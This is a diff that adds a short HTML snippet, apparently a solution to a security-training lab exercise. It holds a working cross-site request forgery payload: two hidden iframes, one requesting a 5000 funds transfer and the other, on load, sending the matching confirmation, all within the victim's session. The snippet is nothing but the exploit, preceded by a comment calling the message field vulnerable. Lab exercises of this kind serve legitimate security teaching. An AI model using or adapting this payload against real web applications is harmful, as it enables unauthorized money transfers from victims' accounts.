@@ -1,0 +1,6 @@
+<!--
+	Message field is vulnerable. Exploit script as shown below
+-->
+<iframe src="attack?Screen=1471017872&menu=900&transferFunds=5000" 
+onload="document.getElementById('second').src='attack?Screen=1471017872&menu=900&transferFunds=CONFIRM';" />
+<iframe id="second" />
